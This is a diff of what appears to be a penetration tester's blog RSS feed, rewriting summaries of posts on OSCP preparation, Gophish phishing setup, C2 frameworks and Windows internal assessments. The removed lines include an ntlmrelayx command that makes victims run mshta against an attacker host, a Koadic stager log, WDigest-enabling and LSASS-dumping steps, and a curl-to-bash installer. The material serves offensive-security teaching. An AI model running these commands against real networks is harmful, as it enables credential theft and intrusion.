@@ -16,7 +16,7 @@
     
     
     <item>
-      <title>ITerm2 Things That Will Help You!</title>
+      <title>ITerm2 Things That Will Help You! 🧨</title>
       <link>/posts/iterm2-things-that-will-help-you/</link>
       <pubDate>Sun, 31 Jul 2022 20:34:46 -0500</pubDate>
       
@@ -29,9 +29,8 @@
         
         
         
-          ITerm2 Things That Will Help You! 🧨 # Gonna just make this as a quick reference to save you some reading. This read will make you so much better.
-TURN ON THE TOOLBELT!!!🛠 # Toolbelt &amp;gt; Show Toolbelt You will likely need to enable Shell Integration for COMMAND HISTORY to work. To do that run the following:
-$ curl -L https://iterm2.com/shell_integration/install_shell_integration_and_utilities.sh | bash # You can also use the Menu.
+          Gonna just make this as a quick reference to save you some reading. This read will make you so much better.
+TURN ON THE TOOLBELT!!!🛠 # Finding this out actually inspired me to write this blog post. I&#39;ve never heard of anyone I know that uses this but this will be extremly helpful to me in the future. The toolbelt will basically open up a pane in the terminal where you can toggle on certain features like.
           
         
         </description>
@@ -51,8 +50,8 @@ $ curl -L https://iterm2.com/shell_integration/install_shell_integration_and_uti
         
         
         
-          Overview # The Starting Line # Syllabus # Hands-On Experience # QwikLabs is a great source for walkthroughs on this and other labs.
-Online Lectures # • https://github.com/open-guides/og-aws • https://www.youtube.com/watch?v=0UZkc3q_DWI • Computing (EC2, Lambda) • Storage (EBS, EFS, S3) • Databases (RDS, DynamoDB, Redshift) • Scalability / Load Balancing (Beanstalk, ASG, CloudFormation) • Networking and Security (VPC, Route53, IAM, Cognito) • Monitoring (CloudWatch, CloudTrail, Flow Logs) • Miscellaneous services like SNS, SQS, SWF, Kinesis, and much more Practice Tests # A.
+          Overview # The Cloud is becoming an increasingly prolific part of modern IT environments. It’s cheap, secure, and offloads responsibilities like patching and hardware maintenance to a third party. Unfortunately, the cloud remains largely misunderstood, even by industry “experts”.
+The Certified Solutions Architect – Associate (CSAA)** certification validates an examinee’s ability to “architect and deploy secure and robust applications on AWS technologies”. Certificate holders can expect, on average, a salary of $130,000 in the U.
           
         
         </description>
@@ -72,11 +71,7 @@ Online Lectures # • https://github.com/open-guides/og-aws • https://www.yout
         
         
         
-          GoDaddy GUI Stuff 🙈 # Setting Up Gophish GUI Stuff 🔧 # The Landing Page: The page that&amp;rsquo;s going to be presented to users when they click your phishing link
-The Email Template: Email sent to your email targets
-Users &amp;amp; Groups: Email targets that will receive the phishing Email
-Sending Profiles: User that is going to be sending out the phishing email
-Landing Page ✈ # The Email Template 📜 # Things to Note on the Email Template 📫 # Users and Groups 😜 # Spam Filters 💫 # Campaign Settings 🔫 # Shout-outs 📢 # __________________ &amp;lt; y0u L1tt13 L14R!
+          GoDaddy GUI Stuff 🙈 # So in my first post I didn&#39;t show how I had all the DNS things set up in GoDaddy. One thing I always get hung up on is adding the TXT record for Let&#39;s encrypt. I always find a way to mess up the TXT record somehow. This is how it should look when you&#39;re waiting for the DNS registrar to update your Let&#39;s Encrypt TXT record: Let&#39;s Encrypt Setting As for the other settings, this is what my Beefhooks.
           
         
         </description>
@@ -97,8 +92,7 @@ Landing Page ✈ # The Email Template 📜 # Things to Note on the Email Templat
         
         
           So I was recently on an internal assessment (Thanks Hexcartel) and got to do some cool tricks I felt like sharing. Behold some tricks:
-Dumping Lsass on Windows 10 😋 # Quick and Easy # Procdump # Getting The Dump Back 👈 # So here&amp;rsquo;s the TLDR steps to do all this:
-Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=enable Wait a while for the target user to auth to their system Use smbclient or Crackmapexec or whatever to upload Procdump and dump lsass with it: C:\users\ANOTHER-USER\desktop\procdump.
+Dumping Lsass on Windows 10 😋 # Quick and Easy # So, we all know you can&amp;rsquo;t just blast Crackmapexec and attach a C2 stager and get shells raining like you could in an unpatched Windows 7 network. See my post on &amp;ldquo;How I use Koadic on Internals&amp;rdquo; for that; No, on Windows 10 we have to be a little more sophisticated.
           
         
         </description>
@@ -118,7 +112,7 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
         
         
         
-           Storytime&amp;hellip; 🎧 # Generosity 🎠 # Lessons 🎒 # IRLS 🌴 # ______________ &amp;lt; 1nT3rn3tic0? &amp;gt; -------------- \ \ oO)-. .-(Oo /__ _\ /_ __\ \ \( | ()~() | )/ / \__|\ | (-___-) | /|__/ &amp;#39; &amp;#39;--&amp;#39; ==`-&amp;#39;== &amp;#39;--&amp;#39; &amp;#39; 
+          Storytime&amp;hellip; 🎧 # So this one&#39;s gonna be short and sweet; More of a lesson than anything. So, for those of you that don&#39;t follow me super close, I recently went on a trip to Cancun Mexico; It was great in case you were wondering. Anywho, one of those days I noticed this huge kiosk that happened to be a 40 inch Flatscreen Touchscreen TV that listed the hotel&#39;s special services and was there for public use.
           
         
         </description>
@@ -139,8 +133,7 @@ Steps 👟 # Enable Wdigest: crackmapexec smb TARGETHOST -M wdigest -o ACTION=en
         
         
           Installing Postfix # First thing you need to do to get started is install postfix on your jump box.
-⋊&amp;gt; /e/gophish sudo apt-get install postfix It also goes without saying that you should back this file up before making changes to it. cp /etc/postfix /etc/postfix.bak will do you well! You can see my postfix config file below:
-Configuring Postfix Main.cf # ⋊&amp;gt; ~ cat /etc/postfix/main.cf 22:28:02 # See /usr/share/postfix/main.cf.dist for a commented, more complete version # Debian specific: Specifying a file name will cause the first # line of that file to be used as the name.
+⋊&amp;gt; /e/gophish sudo apt-get install postfix Once you have it installed you&#39;ll need to configure the main.cf file. After making changes to your main.cf file make sure that the service actually runs. If you run the postfix service with sudo service postfix start do a quick netstat and see if you see port 25 open and listening.
           
         
         </description>
@@ -160,8 +153,8 @@ Configuring Postfix Main.cf # ⋊&amp;gt; ~ cat /etc/postfix/main.cf 22:28:02 # 
         
         
         
-          Overview ☔ # How to Use it &amp;ndash;TLDRers Start here ⤵ # Installation ☕ # git clone https://github.com/byt3bl33d3r/SILENTTRINITY pip3 install pipenv &amp;amp;&amp;amp; pipenv install &amp;amp;&amp;amp; pipenv shell Once the pipenv is set up you should see something similar to what I have here (minus my Moofasa Cow!):
-clutchisback1@Deadpool /e/g/SILENTTRINITY $ pipenv shell 1 changed file master Launching subshell in virtual environment… ______ __ ____ _____ | _ \ \ / / __ / ___| ____| | |_) \ \ /\ / / &amp;#39;_ \| | _| _| | __/ \ V V /| | | | |_| | |___ |_| \_/\_/ |_| |_|\____|_____| _________ &amp;lt; L337Hax &amp;gt; --------- \ ____ \ / \ | ^__^ | | (oo) |______ | (__) | )\/\ \____/|----w | || || Moofasa (SILENTTRINITY) (SILENTTRINITY-9_xnHD7q) clutchisback1@HOMEPC ≫ $ Running Silent Trinity Things 🌀 # (SILENTTRINITY) (SILENTTRINITY-9_xnHD7q) clutchisback1@Deadpool ≫ $ sudo python3 teamserver.
+          Overview ☔ # Yea.....so apparently there is very little documentation for the current build of Silent Trinity. I was in the office today and saw my boy TheTalilama figuring it out so I decided to hop in and see how it worked. It actually does a great job against Windows 10 from what I have seen from just fooling around with it. Let&#39;s get into how it works.
+Download Silent Trinity!
           
         
         </description>
@@ -181,8 +174,7 @@ clutchisback1@Deadpool /e/g/SILENTTRINITY $ pipenv shell 1 changed file master L
         
         
         
-          Backstory 📖 # The Hac..I mean, Workaround Part &amp;ndash;TLDRers Start here ⤵ # So, when you approach the Kiosk this is what you see; and in case you&amp;rsquo;re wondering, that windows key isn&amp;rsquo;t a part of the Windows OS it&amp;rsquo;s some &amp;ldquo;help&amp;rdquo; function as you can see:
-The interesting thing about this is that when you try to access the file system on Windows using Edge it actually opens the directory using Windows Explorer.
+          Backstory 📖 # So...there was this one location in Vegas during Defcon 27 that had these pcs that could be used by the general public. Kiosks as some would say...Well I went over to them to see what all accessibility these kiosks had to offer out of general curiosity, you know, &#34;can these let me access facebook, github, reddit&#34; etc. type stuff. Well, to my astonishment these kiosks had an interface that wouldn&#39;t allow me to access the C:\ drive!
           
         
         </description>
@@ -202,8 +194,7 @@ The interesting thing about this is that when you try to access the file system 
         
         
         
-          Intro # Installation Steps I took&amp;hellip; -TLDRs Start Here ⤵ # To start off I cloned the repository recursively as instructed in the repo&amp;rsquo;s wiki:
-clutchisback1@Deadpool /e/github $ git clone --recurse-submodules https://github.com/cobbr/Covenant Cloning into &amp;#39;Covenant&amp;#39;... remote: Enumerating objects: 1133, done. remote: Counting objects: 100% (1133/1133), done. remote: Compressing objects: 100% (548/548), done. remote: Total 1545 (delta 639), reused 996 (delta 560), pack-reused 412 Receiving objects: 100% (1545/1545), 22.18 MiB | 3.
+          Intro # There&#39;s a lot of hype around the new version of Covenant 3.0 so I figured I&#39;d share my installation experience with the world (I need content...shhhhh...lol). My boy Wraith said it was pretty legit so I had a quick look-see before hoping into bed. It def looks like a solid and modern framework that ups that ante for other C2 frameworks (you&#39;ll never steal my heart from Koadic!
           
         
         </description>
@@ -223,8 +214,7 @@ clutchisback1@Deadpool /e/github $ git clone --recurse-submodules https://github
         
         
         
-          Overview # How I Use it on Internals # sudo ntlmrelayx.py -tf smb_off_hosts -smb2support --enum-local-admins -of &amp;#39;save_the_NTLMv2hashes.txt&amp;#39; -c &amp;#39;mshta http://AttackingHost:9999/sploit&amp;#39; What I Did for You Guys # Hacking things - TLDRs Start Here ⤵ # For demonstrative purposes I executed the mshta through windows explorer like so:
-(koadic: sta/js/mshta)$ run [+] Spawned a stager at http://AttackingIP:9999/sploit [!] Dont edit this URL! (See: &amp;#39;help portfwd&amp;#39;) [&amp;gt;] mshta http://AttackingIP:9999/sploit [+] Zombie 0: Staging new connection (100.
+          Overview # I LOVE KOADIC!! Yes this doesn&#39;t work out of the box against Windows 10+ machines but if you find yourself on a network with older Windows 7 and Windows Server 2012 and below machines Koadic will gobble the network whole and very quickly. I guess I should note that much of what I love about it is it&#39;s organization and implementation of Mimikatz which is probably the real MVP of the tool.
           
         
         </description>
@@ -244,7 +234,7 @@ clutchisback1@Deadpool /e/github $ git clone --recurse-submodules https://github
         
         
         
-          Job Hunting? Go Away&amp;hellip;.😤 # Actually getting a job&amp;hellip;.🔨 # Hacking Huge Companies 🌆 # The Disappearing Act 🎩 # ######## # ################# # ###################### # ######################### # ############################ ############################## ############################### ############################### ############################## # ######## # ## ### #### ## ### ### #### ### #### ########## #### ####################### #### #################### #### ################## #### ############ ## ######## ### ######### ##### ############ ###### ######## ######### ##### ######## ### ######### ###### ############ ####################### # # ### # # ## ######################## ## ## ## ## Metasploit&amp;#39;s ish Questions Comments?
+          Job Hunting? Go Away&amp;hellip;.😤 # So after you become an OSCP you expect jobs to just start raining on you after you stamp that OSCP in your resume and start sending it out. Yea....no. If you&#39;re like me and all you have is OSCP and Hackthebox in terms of network security experience job hunting can be absolutely excruciating. The interviews process can make you feel like you know absolutely nothing; which is partially true if you were like me at the time.
           
         
         </description>
@@ -284,9 +274,7 @@ clutchisback1@Deadpool /e/github $ git clone --recurse-submodules https://github
         
         
         
-          Intro # TLDRs Start Here ⤵ # Having connected to the SMB share named share$, allowed for the wp-config file and several other files containing passwords to be retrieved.
-The /wordpress/wp-config file revealed to following username and password combination:
-/** * @package Akismet */ /* Plugin Name: Akismet Anti-Spam Plugin URI: https://akismet.com/ Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam.
+          Intro # I chose to do this write-up on LazySysAdmin because it is a good box for potential OSCP students to start out on and something that every OSCP pentester and every current OSCP (PWK) student that is ready to take the exam should be able to do without using a walk-through. This box should take 6 hours or less if you do not experience any hang ups or interruptions.
           
         
         </description>
@@ -306,9 +294,7 @@ The /wordpress/wp-config file revealed to following username and password combin
         
         
         
-          Exam Attempt 1 UPDATED (Aug 3, 2018) to redact file names and fix errors!
-Exam Attempt 1
-Please Note: This exam is nothing more than Vulnhub boxes collected into a zip file with the file names changed to create a black box environment. No privileged Offensive Security exam details are disclosed in this exam.
+          Overview Whether you are in preparation for your lab time to begin or you just want to get a feel for what exam day will be like, I&#39;ve put together a few practice exams for future OSCP students to take. These boxes should be comprehensive enough to cover many of the basics that you will face in the labs. All of these boxes will have write-ups available for you to review AFTER your exam time has ended.
           
         
         </description>
@@ -328,8 +314,9 @@ Please Note: This exam is nothing more than Vulnhub boxes collected into a zip f
         
         
         
-           Easter Eggs in this post! 🥚
-TLDR&amp;rsquo;ers Start Here ⤵ # TLDR&amp;rsquo;ers End Here ⤴ # 
+          Easter Eggs in this post! 🥚
+If you&#39;ve taken the red pill and decided to begin your journey towards the OSCP certification you will likely come to a point where you begin to wonder if you are ready to take/passthe exam. This article will serve as a guide in helping you determine just that. Let&#39;s begin!
+TLDR&amp;rsquo;ers Start Here ⤵ # You&#39;ve have most of the public network rooted: If you have about 60% of the public network rooted I would say that is a good time to start thinking about taking the exam.
           
         
         </description>
@@ -349,8 +336,7 @@ TLDR&amp;rsquo;ers Start Here ⤵ # TLDR&amp;rsquo;ers End Here ⤴ #
         
         
         
-          Read Time: 16 mins By: Clutchisback1
-I hate reading boring articles so I&amp;rsquo;m not going to waste any of your time by writing one. Besides, you&amp;rsquo;re probably an PWK student with lab time ticking away each second as you get closer to your exam date; The very exam date that will determine whether or not you&amp;rsquo;ve become a man/woman yet in the information security industry. Right now, you&amp;rsquo;re still a little boy/girl with absolutely nothing going for yourself.
+          I hate reading boring articles so I&amp;rsquo;m not going to waste any of your time by writing one. Besides, you&amp;rsquo;re probably an PWK student with lab time ticking away each second as you get closer to your exam date; The very exam date that will determine whether or not you&amp;rsquo;ve become a man/woman yet in the information security industry. Right now, you&amp;rsquo;re still a little boy/girl with absolutely nothing going for yourself.
           
         
         </description>
